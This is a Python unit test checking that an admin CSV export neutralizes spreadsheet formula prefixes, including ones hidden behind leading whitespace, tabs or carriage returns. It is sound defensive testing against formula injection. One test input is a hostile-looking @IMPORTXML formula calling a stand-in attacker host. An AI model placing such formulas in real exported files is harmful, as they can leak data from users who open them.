from __future__ import annotations

import csv
import io

from gateway_provider.admin_export_module import _encode_csv


def test_admin_csv_neutralizes_formula_prefixes_after_leading_whitespace() -> None:
    payload = _encode_csv(
        ("reason",),
        [
            ("=1+1",),
            ("  +SUM(A1:A2)",),
            ("\t@IMPORTXML(\"https://attacker.invalid\")",),
            ("\r-2+3",),
            ("ordinary reason",),
        ],
    )

    rows = list(csv.reader(io.StringIO(payload.decode("utf-8-sig"))))
    assert rows == [
        ["reason"],
        ["'=1+1"],
        ["'  +SUM(A1:A2)"],
        ["'\t@IMPORTXML(\"https://attacker.invalid\")"],
        ["'\r-2+3"],
        ["ordinary reason"],
    ]
